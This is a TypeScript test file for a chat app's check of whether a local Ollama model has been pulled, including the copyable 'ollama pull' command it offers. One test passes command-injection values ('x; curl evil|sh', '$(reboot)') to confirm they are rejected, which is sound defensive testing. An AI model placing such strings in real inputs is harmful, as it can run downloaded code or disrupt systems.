import { describe, expect, it } from "vitest";
import { missingProviderAction, modelNotPulled, providerReadiness, rowStatus, rowTone } from "./chatProvider";
import { nextStep } from "../providers/nextStep";
import type { Connection } from "../providers/providerStore";

const ollama = (over: Partial<Connection> = {}): Connection =>
  ({
    id: "ollama-local", provider: "ollama", label: "Ollama local", residence: "local", endpoint: "", secret: null,
    health: "live", detail: "", probes: [], facts: [], enabled: true, lastProbe: "",
    models: [{ id: "gemma4:26b", ctx: 0 }, { id: "llama3.2:latest", ctx: 0 }], modelsFromEndpoint: true,
    defaultModel: "qwen3:8b", ...over,
  }) as Connection;

describe("Model not pulled (local Ollama)", () => {
  it("a default model missing from the endpoint's own list is not ready, and says so", () => {
    expect(modelNotPulled(ollama())).toBe("qwen3:8b");
    expect(providerReadiness(ollama())).toMatchObject({ ready: false, state: "needs-model", missing: "model-not-pulled" });
    expect(rowStatus(ollama())).toBe("Model not pulled");
    expect(rowTone(ollama())).toBe("attention");
  });

  it("offers one action: copy `ollama pull <id>`, then test again", () => {
    expect(nextStep(ollama())).toMatchObject({
      kind: "copy", copy: "ollama pull qwen3:8b", label: "Copy `ollama pull qwen3:8b`", status: "Model not pulled", thenRetest: true,
    });
  });

  it("the composer names the model to pull", () => {
    expect(missingProviderAction([ollama()], "ollama-local")).toEqual({ text: "Pull qwen3:8b to send", id: "ollama-local" });
  });

  it("a fresh Ollama with nothing pulled (empty list) is flagged, not read as ready", () => {
    expect(modelNotPulled(ollama({ models: [] }))).toBe("qwen3:8b");
  });

  it("a registry host:port prefix is not mistaken for a tag", () => {
    const c = ollama({ defaultModel: "localhost:5000/team/model", models: [{ id: "localhost:5000/team/model:latest", ctx: 0 }] });
    expect(modelNotPulled(c)).toBeNull();
  });

  it("an id that is not a model name is never offered for the clipboard", () => {
    expect(modelNotPulled(ollama({ defaultModel: "x; curl evil|sh" }))).toBeNull();
    expect(modelNotPulled(ollama({ defaultModel: "$(reboot)" }))).toBeNull();
  });

  it("a turned-off connection still asks for the switch first, in the composer too", () => {
    const off = ollama({ enabled: false });
    expect(providerReadiness(off).missing).toBe("turn-on");
    expect(missingProviderAction([off], "ollama-local")?.text).toBe("Turn on Ollama local to send");
  });

  it.each([
    ["a pulled model", { defaultModel: "gemma4:26b" }],
    ["an untagged name that matches :latest", { defaultModel: "llama3.2" }],
    ["no default model yet (that is 'No model chosen')", { defaultModel: "" }],
    ["a static catalog list, which proves nothing", { modelsFromEndpoint: false }],
    ["Ollama Cloud, which does not pull", { residence: "cloud" as const }],
    ["a failed probe, whose list may be stale", { health: "fault" as const }],
    ["a probe in flight", { health: "probing" as const }],
    ["another provider", { provider: "openrouter" as const }],
  ])("is not raised for %s", (_name, over) => {
    expect(modelNotPulled(ollama(over as Partial<Connection>))).toBeNull();
  });
});
